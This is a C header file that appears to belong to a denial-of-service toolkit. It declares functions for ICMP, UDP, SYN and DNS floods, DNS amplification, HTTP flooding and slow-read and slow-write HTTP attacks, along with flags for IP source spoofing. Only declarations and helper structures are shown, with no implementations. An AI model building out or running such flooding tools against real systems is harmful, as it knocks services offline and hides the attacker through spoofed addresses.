#ifndef DDOS_COMMON_H
#define DDOS_COMMON_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <time.h>
#include <errno.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>


#define fail_sys(...) (fprintf(stderr, "%d: %s\n", errno, strerror(errno)), fprintf(stderr, __VA_ARGS__), fprintf(stderr, "\n"), exit(1))
#define fail(...) (fprintf(stderr, __VA_ARGS__), fprintf(stderr, "\n"), exit(1))


struct ddos_flags {
    int ip_spoof   : 1;
    int rand_sport : 1;
};

// bytevector.c
struct bytevector {
    unsigned char *begin;
    unsigned char *end;
    unsigned char *cap;
};
extern size_t bytevector_size(const struct bytevector *v);
extern size_t bytevector_capacity(const struct bytevector *v);
extern void *bytevector_data(const struct bytevector *v);
extern void bytevector_realloc(struct bytevector *v, size_t new_capacity);
extern void bytevector_init(struct bytevector *v);
extern void bytevector_append(struct bytevector *v, const void *data, size_t data_len);
extern void bytevector_append_u8(struct bytevector *v, unsigned char val);
extern void bytevector_append_u16(struct bytevector *v, unsigned short val);
extern void bytevector_append_str(struct bytevector *v, const char *str);
extern void bytevector_append_strnz(struct bytevector *v, const char *str);
extern void bytevector_free(struct bytevector *v);
extern void bytevector_dump(const struct bytevector *v);

// pq.c
#define pq_lch(x) ((x) * 2 + 1)
#define pq_rch(x) ((x) * 2 + 2)
#define pq_fa(x) (((x) - 1) / 2)
typedef int (*pq_less)(const void *, const void *);
typedef void (*pq_setptr)(void *, size_t);
struct priority_queue {
    void **data;
    size_t size;
    size_t capacity;
    pq_less less;
    pq_setptr setptr;
};
extern void pq_init(struct priority_queue *pq, size_t capacity, pq_less less, pq_setptr setptr);
extern void pq_free(struct priority_queue *pq);
extern void pq_deckey(struct priority_queue *pq, size_t item);
extern void *pq_top(struct priority_queue *pq);
extern int pq_empty(struct priority_queue *pq);
extern void pq_push(struct priority_queue *pq, void *item);
extern void pq_pop(struct priority_queue *pq);
extern void pq_erase(struct priority_queue *pq, size_t item);



// in_cksum.c
extern unsigned short in_cksum(unsigned short *addr, int len);

// ip.c
#define DDOS_IPHDR_LEN 20
extern int ip_rawsocket();
extern void ip_init(struct ip *ip, u_int8_t p);
extern void ip_setsrc(struct ip *ip, struct in_addr src);
extern void ip_setdst(struct ip *ip, struct in_addr dst);
extern void ip_setid(struct ip *ip, u_short id);
extern void ip_resize(struct ip *ip, ushort datalen);
extern void ip_cksum(struct ip *ip);
extern ushort ip_size(struct ip *ip);
extern void ip_mksaddr(struct sockaddr_in *saddr, struct in_addr addr);


// icmp_flood.c
extern void icmp_flood(struct in_addr src, struct in_addr dst, struct ddos_flags flags, unsigned long long maxcount);

// udp_flood.c
extern void udp_flood(struct in_addr src, ushort srcport, struct in_addr dst, ushort dstport, void *data, size_t datalen, void (*dataupdater)(void *), struct ddos_flags flags, unsigned long long maxcount);

// dns_flood.c
extern void dns_flood(struct in_addr src, struct in_addr dst, struct ddos_flags flags, unsigned long long maxcount);
extern void dns_amplification(struct in_addr dnsserver, struct in_addr dst, unsigned long long maxcount);

// syn_flood.c
extern void syn_flood(struct in_addr src, ushort srcport, struct in_addr dst, ushort dstport, struct ddos_flags flags, unsigned long long maxcount);

// tcp.c
#define TCPPOLL_MAXEV 10
struct tcpconn {
    // if conn is free, fd == -1 and conn_userdata points to next free node
    // if conn is being used, fd >= 0
    int fd;
    void *conn_userdata;
    
    // heap
    size_t heap_ptr;
    struct timespec nextsche;
    int inpq;
};
struct tcppool {
    // pool configuration
    struct sockaddr_in dstaddr;
    int maxconn;
    void *pool_userdata;
    
    // user callback
    void (*new_conn)(struct tcpconn *conn, struct tcppool *pool);
        // allocate a new connection
    void (*del_conn)(struct tcpconn *conn, struct tcppool *pool);
        // delete a existing connection
    int (*conn_onevent)(struct tcpconn *conn, struct tcppool *pool);
        // event occurd, after doing some processing
        //     if connection is blocked, should return < 0
        //     if should scheule later, should modify nextsche and return > 0
        //     if should close connection, should return = 0
    
    // internal data
    int epfd; // epoll fd
    struct tcpconn *conn; // node array
    struct priority_queue pq;
    struct tcpconn *flist; // free list
};
extern void tcppool_init(struct tcppool *p, struct in_addr dstaddr, ushort dstport, int maxconn, void *pool_userdata, void (*new_conn)(struct tcpconn *conn, struct tcppool *pool), void (*del_conn)(struct tcpconn *conn, struct tcppool *pool), int (*conn_onevent)(struct tcpconn *conn, struct tcppool *pool));
extern void tcppool_oneloop(struct tcppool *p);
extern void tcppool_free(struct tcppool *p);
extern void tcppool_delaysche(struct tcpconn *c, long long ms);


// http.c
extern void http_flood(struct in_addr dstaddr, ushort dstport, const char *host, const char *url, int connections, int request_per_conn, int request_wait);
extern void http_slowread(struct in_addr dstaddr, ushort dstport, const char *host, const char *url, int connections, int read_size, int read_wait, int read_timeout);
extern void http_slowwrite(struct in_addr dstaddr, ushort dstport, const char *host, const char *url, int connections, int write_wait);


// misc.c
struct counter {
    unsigned long long cnt;
    const char *unit;
    struct timespec ts;
};
extern void counter_reset(struct counter *counter, const char *unit);
extern int counter_inc(struct counter *counter);
extern int counter_less(struct counter *counter, unsigned long long cnt);
extern u_int32_t rand_u32();
extern u_int16_t rand_u16();
extern u_int16_t rand_port();
extern void dump(void *memaddr, size_t memsize);

// ts.c
extern void ts_plus(struct timespec *tsp2, const struct timespec *tsp1, long long ms);
extern long long ts_minus(const struct timespec *tsp1, const struct timespec *tsp2);
extern int ts_less(const struct timespec *tsp1, const struct timespec *tsp2);

#endif
